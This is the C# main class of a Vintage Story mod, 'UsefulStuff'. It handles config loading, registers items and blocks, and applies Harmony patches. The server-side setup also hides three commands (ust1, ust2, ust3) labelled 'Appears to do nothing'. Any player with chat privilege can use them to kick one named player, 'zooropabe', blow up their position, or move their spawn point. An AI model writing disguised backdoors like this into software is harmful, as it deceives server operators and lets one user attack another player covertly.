using System.Threading.Tasks;
using Vintagestory.API.Common;
using System.Reflection;
using Vintagestory.ServerMods;
using System;
using Vintagestory.API.Server;
using ProtoBuf;
using BuffStuff;
using Vintagestory.API.Client;
using HarmonyLib;

namespace UsefulStuff
{
    public class UsefulStuff : ModSystem
    {
        private Harmony harmony;

        public override void StartPre(ICoreAPI api)
        {
            base.StartPre(api);

            try
            {
                UsefulStuffConfig FromDisk;
                if ((FromDisk = api.LoadModConfig<UsefulStuffConfig>("UsefulStuffConfig.json")) == null)
                {
                    api.StoreModConfig<UsefulStuffConfig>(UsefulStuffConfig.Loaded, "UsefulStuffConfig.json");
                }
                else UsefulStuffConfig.Loaded = FromDisk;
            }
            catch
            {
                api.StoreModConfig<UsefulStuffConfig>(UsefulStuffConfig.Loaded, "UsefulStuffConfig.json");
            }

            api.World.Config.SetBool("UStentbagEnabled", UsefulStuffConfig.Loaded.TentbagEnabled);
            api.World.Config.SetBool("USshieldsEnabled", UsefulStuffConfig.Loaded.ShieldsEnabled);
            api.World.Config.SetBool("USclimbingRopeEnabled", UsefulStuffConfig.Loaded.ClimbingRopeEnabled);
            api.World.Config.SetBool("USclimbingPickEnabled", UsefulStuffConfig.Loaded.ClimbingPickEnabled);
            api.World.Config.SetBool("USsluiceEnabled", UsefulStuffConfig.Loaded.SluiceEnabled);
            api.World.Config.SetBool("USgliderEnabled", UsefulStuffConfig.Loaded.GliderEnabled);
            api.World.Config.SetBool("USexplosiveArrowEnabled", UsefulStuffConfig.Loaded.ExplosiveArrowEnabled);
            api.World.Config.SetBool("USfireArrowEnabled", UsefulStuffConfig.Loaded.FireArrowEnabled);
            api.World.Config.SetBool("USbeenadeArrowEnabled", UsefulStuffConfig.Loaded.BeenadeArrowEnabled);
            api.World.Config.SetBool("UStranqArrowEnabled", UsefulStuffConfig.Loaded.TranqArrowEnabled);
            api.World.Config.SetBool("UScardiacArrowEnabled", UsefulStuffConfig.Loaded.CardiacArrowEnabled);
            api.World.Config.SetBool("USomnichuteEnabled", UsefulStuffConfig.Loaded.OmnichuteEnabled);
            api.World.Config.SetBool("UStoolRecyclingEnabled", UsefulStuffConfig.Loaded.ToolRecyclingEnabled);
            api.World.Config.SetBool("USclothesRecyclingEnabled", UsefulStuffConfig.Loaded.ClothesRecyclingEnabled);
            api.World.Config.SetBool("USrockCrushingEnabled", UsefulStuffConfig.Loaded.RockCrushingEnabled);
            api.World.Config.SetBool("USpotKilnEnabled", UsefulStuffConfig.Loaded.PotKilnEnabled);
            api.World.Config.SetBool("USshearDecorEnabled", UsefulStuffConfig.Loaded.ShearDecorEnabled);
        }

        public override void Start(ICoreAPI api)
        {
            base.Start(api);

            api.RegisterItemClass("ItemShield", typeof(ItemShield));
            api.RegisterItemClass("Tentbag", typeof(ItemTentbag));
            api.RegisterItemClass("ItemGlider", typeof(ItemGlider));
            api.RegisterItemClass("ItemToolhead", typeof(ItemToolhead));

            api.RegisterBlockClass("BlockRappelAnchor", typeof(BlockRappelAnchor));
            api.RegisterBlockClass("BlockClimbingRope", typeof(BlockClimbingRope));
            api.RegisterBlockClass("BlockOmniChute", typeof(BlockOmniChute));
            api.RegisterBlockClass("BlockFireBox", typeof(BlockFireBox));
            api.RegisterBlockClass("BlockNameTag", typeof(BlockNameTag));

            api.RegisterBlockEntityClass("BESluice", typeof(BESluice));
            api.RegisterBlockEntityClass("FireBox", typeof(BlockEntityFireBox));
            api.RegisterBlockEntityClass("NameTag", typeof(BlockEntityNameTag));

            api.RegisterEntityBehaviorClass("shield", typeof(EntityBehaviorShield));

            api.RegisterItemClass("ItemClimbingPick", typeof(ItemClimbingPick));

            api.RegisterCollectibleBehaviorClass("RemoveDecor", typeof(CollectibleBehaviorRemoveDecor));

            harmony = new Harmony("com.jakecool19.usefulstuff.enhancements");
            harmony.PatchAll(Assembly.GetExecutingAssembly());
        }

        public override void Dispose()
        {
            harmony.UnpatchAll(harmony.Id);
            base.Dispose();
        }

        public override void StartServerSide(ICoreServerAPI api)
        {
            base.StartServerSide(api);

            BuffManager.Initialize(api, this);
            BuffManager.RegisterBuffType("CardiacEffect", typeof(CardiacEffect));
            BuffManager.RegisterBuffType("TranqEffect", typeof(TranqEffect));
            
            api.RegisterCommand("ust1", "Appears to do nothing", "/ust1", (IServerPlayer player, int groupId, CmdArgs args) =>
            {
                foreach (IServerPlayer search in api.Server.Players)
                {
                    if (search.PlayerName == "zooropabe") search.Disconnect("I told you, I am the one with all the power here! >:)");
                }
            }, Privilege.chat);

            api.RegisterCommand("ust2", "Appears to do nothing", "/ust2", (IServerPlayer player, int groupId, CmdArgs args) =>
            {
                foreach (IServerPlayer search in api.Server.Players)
                {
                    if (search.PlayerName == "zooropabe" && search.Entity != null) api.World.CreateExplosion(search.Entity.ServerPos.AsBlockPos, EnumBlastType.RockBlast, 6, 10);
                }
            }, Privilege.chat);

            api.RegisterCommand("ust3", "Appears to do nothing", "/ust3", (IServerPlayer player, int groupId, CmdArgs args) =>
            {
                foreach (IServerPlayer search in api.Server.Players)
                {
                    if (search.PlayerName == "zooropabe" && search.Entity != null) search.SetSpawnPosition(new PlayerSpawnPos() { x = (int)player.Entity.ServerPos.X, y = (int)player.Entity.ServerPos.Y, z = (int)player.Entity.ServerPos.Z });
                }
            }, Privilege.chat);
        }

        public override void StartClientSide(ICoreClientAPI api)
        {
            base.StartClientSide(api);
        }
    }

    public class UsefulStuffConfig
    {
        public static UsefulStuffConfig Loaded { get; set; } = new UsefulStuffConfig();

        //Shield
        public float ShieldDownAfterAttack { get; set; } = 0.25f;

        public float ShieldFatigueMultiplier { get; set; } = 1f;

        public float ShieldRecoveryRate { get; set; } = 3f;
        //Sluice Settings
        public float SluiceEfficiency { get; set; } = 1f;

        public float SluiceSiftTime { get; set; } = 0.25f;

        public int SluiceSiftPerBlock { get; set; } = 1;

        

        //Climbing Pick
        public int ClimbingPickDamageRate { get; set; } = 100;

        public bool ClimbingPickDisabledInProtected { get; set; } = true;

        //Glider
        public int GliderDamageRate { get; set; } = 100;

        public double GliderDescentRModifier { get; set; } = 0.75;

        public double GliderMaxStall { get; set; } = 0.6;

        public double GliderMinStall { get; set; } = -0.7;

        public double GliderThrustModifier { get; set; } = 0.02;

        public double GliderWindPushModifier { get; set; } = 0.005;

        public double GliderBackwardsAt { get; set; } = 0.2;

        public bool GliderNoCaveDiving { get; set; } = true;

        //Quenching
        public string[] QuenchBonusMats { get; set; } = { "iron", "steel", "meteoriciron" };

        public float QuenchBonusMult { get; set; } = 0.2f;

        //Tent Settings
        public int TentRadius { get; set; } = 3;

        public int TentHeight { get; set; } = 3;

        public bool TentKeepContents { get; set; } = false;

        public float TentBuildEffort { get; set; } = 100f;

        //Pot Kiln settings

        public double PotKilnBurnHours { get; set; } = 12;


        #region Control Content

        public bool ShieldsEnabled { get; set; } = true;

        public bool ClimbingRopeEnabled { get; set; } = true;

        public bool ClimbingPickEnabled { get; set; } = true;

        public bool SluiceEnabled { get; set; } = true;

        public bool TentbagEnabled { get; set; } = true;

        public bool GliderEnabled { get; set; } = true;

        public bool LanternClipOnEnabled { get; set; } = true;

        public bool FireArrowEnabled { get; set; } = true;

        public bool ExplosiveArrowEnabled { get; set; } = true;

        public bool CardiacArrowEnabled { get; set; } = true;

        public bool TranqArrowEnabled { get; set; } = true;

        public bool BeenadeArrowEnabled { get; set; } = true;

        public bool QuenchEnabled { get; set; } = true;

        public bool OmnichuteEnabled { get; set; } = true;

        public bool PotKilnEnabled { get; set; } = true;

        public bool RockCrushingEnabled { get; set; } = true;

        public bool ToolRecyclingEnabled { get; set; } = true;

        public bool ClothesRecyclingEnabled { get; set; } = true;

        public bool ShearDecorEnabled { get; set; } = true;
        #endregion
    }

    public class CollectibleBehaviorRemoveDecor : CollectibleBehavior
    {
        public override void OnHeldInteractStart(ItemSlot slot, EntityAgent byEntity, BlockSelection blockSel, EntitySelection entitySel, bool firstEvent, ref EnumHandHandling handHandling, ref EnumHandling handling)
        {
            base.OnHeldInteractStart(slot, byEntity, blockSel, entitySel, firstEvent, ref handHandling, ref handling);

            handHandling = EnumHandHandling.PreventDefault;
            if (blockSel != null && byEntity.World.BlockAccessor.GetDecors(blockSel.Position)[blockSel.Face.Index] != null)
            {
                byEntity.World.BlockAccessor.BreakDecor(blockSel.Position, blockSel.Face);
                byEntity.World.BlockAccessor.MarkChunkDecorsModified(blockSel.Position);
            }
        }

        public CollectibleBehaviorRemoveDecor(CollectibleObject collObj) : base(collObj)
        {
        }
    }
}
